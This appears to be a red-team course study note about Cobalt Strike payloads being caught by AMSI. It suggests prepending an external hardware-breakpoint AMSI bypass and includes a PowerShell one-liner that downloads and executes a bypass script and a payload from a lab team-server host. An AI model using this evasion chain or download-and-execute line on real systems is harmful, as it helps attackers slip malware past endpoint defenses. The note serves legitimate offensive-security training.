
You may run into situations where ThreatCheck gives the "all clear" on a payload, but it still gets caught by AMSI.  This is particularly troublesome for initial access or lateral movement payloads, because Beacon's `amsi_disable` directive does not apply to them (post-ex evasion).

![[invoke-mimi.png]]

#### 🖊️ Reasons for detection

- Defender engine/signature versions differ between lab machines
- Malicious part of the payload may be buried under one or more layers of execution.

#### 📔 Workaround

We can integrate an external AMSI bypass into our payloads.  For example, this method by [@_EthicalChaos_](https://twitter.com/_EthicalChaos_) (modified by [@ShitSecure](https://twitter.com/ShitSecure)) which utilizes hardware breakpoints.

Save this code to a file: [[manual-amsi-code-bypass]]

We could save this off to a new file and host it at a different URI on the team server.  Then just call and invoke this bypass script before the payload.

```
PS C:\Users\bfarmer> iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
```



#### ⚠ Opsec




### Properties
---
📆 created   {{28-02-2024}} 23:39
🏷️ tags: #redteam #crto 

---

